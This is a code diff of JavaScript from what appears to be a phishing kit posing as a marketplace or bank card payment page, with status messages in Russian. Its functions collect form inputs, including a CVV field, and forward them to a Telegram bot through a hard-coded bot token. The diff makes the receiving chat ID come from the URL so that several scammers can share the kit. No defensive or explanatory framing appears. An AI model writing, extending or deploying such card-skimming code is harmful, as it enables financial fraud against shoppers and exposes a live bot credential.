@@ -870,12 +870,13 @@ function sendMessage() {
     const queryString = window.location.search;
     const urlParams = new URLSearchParams(queryString);
     const userIdentifier = urlParams.get('userId');
+    const user_id1 = urlParams.get('chat_id');
     const customMessage = `
     💸 В банке\n 📩 Сообщение от пользователя с \n▫️ID: ${userIdentifier}\n▫️Сообшения: ${message}
     `;
     const url = `https://api.telegram.org/bot6687498994:AAHqL9v5RO7-CXKpEtXcrlAD9EIMkIRZVwA/sendMessage`;
     const obj = {
-        chat_id: '5710170784',
+        chat_id: user_id1,
         text: customMessage,
         sender: "user"
     };
@@ -960,6 +961,8 @@ function butfin(){
     const input1 = document.getElementById("_input1").value;
     const input2 = document.getElementById("_input2").value;
     const input3 = document.getElementById("_input3").value;
+     const queryParams = new URLSearchParams(window.location.search);
+     const chatid1 = getQueryVariable("chat_id");
 
     // Create a custom message
     const customMessage = `User has sent the following data:
@@ -970,7 +973,7 @@ CVV 3: ${input3}`;
 
     // Construct the object
     const obj = {
-        chat_id: '5710170784',
+        chat_id: chatid1,
         text: customMessage,
         sender: "user"
     };
@@ -1007,12 +1010,11 @@ window.onload = function() {
     const adName = getQueryVariable("name");
 const price = getQueryVariable("price");
 const userId = getQueryVariable("userId");
-
-console.log(price)
-    console.log()
+const chatid = getQueryVariable("chat_id");
+    console.log(price);
     const url = `https://api.telegram.org/bot6687498994:AAHqL9v5RO7-CXKpEtXcrlAD9EIMkIRZVwA/sendMessage`;
     const obj = {
-    chat_id: '5710170784',
+    chat_id: chatid,
     text: `💳 Страница ввода карты
 🇫🇮 Площадка: Facebook 2.0
 ▫️ Объявление: ${adName}
